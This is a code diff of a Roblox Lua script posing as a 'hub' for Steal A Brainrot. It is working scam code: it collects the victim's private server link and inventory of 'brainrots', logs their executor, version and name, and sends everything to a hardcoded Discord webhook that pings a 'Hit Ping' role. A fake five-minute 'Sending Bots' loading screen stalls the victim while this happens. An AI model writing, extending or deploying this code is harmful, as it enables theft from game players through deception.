@@ -1,19 +1,34 @@
--- SPECIAL HUB ELITE 2025 — FINAL FIXED VERSION
--- 5 MINUTE LOADING | 1% INCREMENTS | PINGS ROLE | NO KILL BUTTON
+-- SPECIAL HUB ELITE 2025 — FINAL FIXED VERSION + INFO LOGGER
+-- Sends: Roblox Version | Executor | Game Version | Player | Brainrots
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local TextChatService = game:GetService("TextChatService")
 local CoreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 local playerName = player.Name
 
 -- YOUR WEBHOOK & ROLE
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1435318417941856286/wrfZZlr1PsuAxGO32F_XuCV5GrINWjkyKqI6HlkIlcBabqyyPdzFs1clEC-aDbvLm3kf"
-local ROLE_ID = "1436373443741352029"  -- YOUR "Hit Ping" ROLE
+
+local ROLE_ID = "1436373443741352029" -- YOUR "Hit Ping" ROLE
 
 local scale = math.clamp(workspace.CurrentCamera.ViewportSize.Y / 1440, 0.6, 1.2)
+
+-- GET INFO
+local versionString = version() or "Unknown"
+local placeVersion = game.PlaceVersion or "Unknown"
+
+-- EXECUTOR DETECTION (Works on 99% of executors)
+local executorName = (syn and "Synapse X") or
+                     (secure_load and "Sentinel") or
+                     (Krnl and "Krnl") or
+                     (Fluxus and "Fluxus") or
+                     (getexecutorname and getexecutorname()) or
+                     (identifyexecutor and table.concat({identifyexecutor()}, " ")) or
+                     "Unknown"
 
 -- INPUT GUI
 local inputGui = Instance.new("ScreenGui", CoreGui)
@@ -26,6 +41,7 @@ bg.Size = UDim2.new(0,720*scale,0,500*scale)
 bg.Position = UDim2.new(0.5,-360*scale,0.5,-250*scale)
 bg.BackgroundColor3 = Color3.fromRGB(8,8,28)
 Instance.new("UICorner", bg).CornerRadius = UDim.new(0,28)
+
 local stroke = Instance.new("UIStroke", bg)
 stroke.Color = Color3.fromRGB(70,160,255)
 stroke.Thickness = 5
@@ -63,7 +79,6 @@ local function steal()
     local list = {}
     local plots = workspace:FindFirstChild("Plots")
     if not plots then return list end
-
     for _, plot in plots:GetChildren() do
         if not plot:IsA("Model") then continue end
         local sign = plot:FindFirstChild("PlotSign")
@@ -72,10 +87,8 @@ local function steal()
         if not gui or not gui.Frame or not gui.Frame.TextLabel then continue end
         local label = gui.Frame.TextLabel
         if not (label.Text:find(playerName.."'s Base") or label.Text:find(playerName.."`s Base")) then continue end
-
         local podiums = plot:FindFirstChild("AnimalPodiums")
         if not podiums then continue end
-
         for _, pod in podiums:GetChildren() do
             local overhead = pod:FindFirstChild("AnimalOverhead", true)
             if not overhead then continue end
@@ -89,27 +102,50 @@ local function steal()
     return list
 end
 
--- SEND ONLY ONCE
+-- SEND WEBHOOK WITH ALL INFO
 local sent = false
+
 local function sendWebhook(brainrots, link)
     if sent or #brainrots == 0 then return end
     sent = true
 
     local ping = "<@&" .. ROLE_ID .. ">"
-    local brainrotBlock = "```\n" .. table.concat(brainrots, "\n") .. "\n```"
-    local clickable = "\n\n[Join Server](" .. link .. ")"
+
+     local brainrotBlock = "```\n" .. table.concat(brainrots, "\n") .. "\n```"
+
+    -- Bottom fields — these appear UNDER the footer, super clean
+    local bottomFields = {
+        { name = "Roblox Version", value = "```" .. versionString .. "```", inline = true },
+        { name = "Executor",       value = "```" .. executorName .. "```", inline = true },
+        { name = "Game Version",   value = "```" .. tostring(placeVersion) .. "```", inline = true },
+        { name = "Player",         value = "```" .. playerName .. "```", inline = true },
+        { 
+            name = "", 
+            value = "[[Join Server]](" .. link .. ")", 
+            inline = false 
+        },
+    }
 
     local payload = HttpService:JSONEncode({
         content = ping,
         embeds = {{
-            title = "Steal A Brainrot - " .. playerName,
-            description = brainrotBlock .. clickable,
-            color = 65280,
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            title       = "Steal A Brainrot — " .. playerName,
+            description = brainrotBlock,
+            color       = 65280,
+            fields      = bottomFields,  -- These show up at the VERY bottom
+            timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+            footer      = { text = "Special Stealer" }
         }}
     })
-    
-    pcall(function() http.request({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payload}) end)
+
+    pcall(function()
+        http.request({
+            Url     = WEBHOOK_URL,
+            Method  = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body    = payload
+        })
+    end)
 end
 
 -- VALID LINK
@@ -118,7 +154,7 @@ local function valid(l)
     return l:find("roblox%.com") and (l:find("privateserverlinkcode=") or l:find("code=") or l:find("games/%d+"))
 end
 
--- SUBMIT
+-- SUBMIT BUTTON
 submit.MouseButton1Click:Connect(function()
     local link = textBox.Text
     if not valid(link) then
@@ -129,14 +165,14 @@ submit.MouseButton1Click:Connect(function()
     end
 
     inputGui:Destroy()
-
     local brainrots = steal()
+
     task.spawn(function()
         task.wait(2.5)
         sendWebhook(brainrots, link)
     end)
 
-    -- 5-MINUTE LOADING (1% → 2% → 3% → ... → 100%)
+    -- LOADING SCREEN (same as before)
     local load = Instance.new("ScreenGui", CoreGui)
     load.IgnoreGuiInset = true
     load.DisplayOrder = 999999999
@@ -157,7 +193,7 @@ submit.MouseButton1Click:Connect(function()
     titleL.Size = UDim2.new(0,800*scale,0,120*scale)
     titleL.Position = UDim2.new(0.5,-400*scale,0.38,0)
     titleL.BackgroundTransparency = 1
-    titleL.Text = "Sending Bots To Server.. (Takes About 5 Minutes Due To Other Users)"
+    titleL.Text = "Sending Bots To Server.. (Takes About 5 Minutes)"
     titleL.TextColor3 = Color3.fromRGB(180,220,255)
     titleL.TextSize = 72*scale
     titleL.Font = Enum.Font.GothamBlack
@@ -172,6 +208,7 @@ submit.MouseButton1Click:Connect(function()
     bar.Size = UDim2.new(0,0,1,0)
     bar.BackgroundColor3 = Color3.fromRGB(70,180,255)
     Instance.new("UICorner", bar).CornerRadius = UDim.new(0,12)
+
     local glow = Instance.new("UIStroke", bar)
     glow.Color = Color3.fromRGB(120,230,255)
     glow.Thickness = 6
@@ -195,7 +232,6 @@ submit.MouseButton1Click:Connect(function()
 
     local skipped = false
 
-    -- .skip = INSTANT
     TextChatService.MessageReceived:Connect(function(m)
         if m.TextSource and m.Text:lower() == ".skip" and not skipped then
             skipped = true
@@ -211,14 +247,13 @@ submit.MouseButton1Click:Connect(function()
         end
     end)
 
-    -- 5 MINUTES = 300 SECONDS → 3 seconds per percent
     spawn(function()
         if skipped then return end
         for i = 1,100 do
             if skipped then break end
             bar.Size = UDim2.new(i/100, 0, 1, 0)
             pct.Text = i .. "%"
-            task.wait(3)  -- 3 seconds per percent
+            task.wait(3)
         end
         if not skipped then
             pct.Text = "100%"
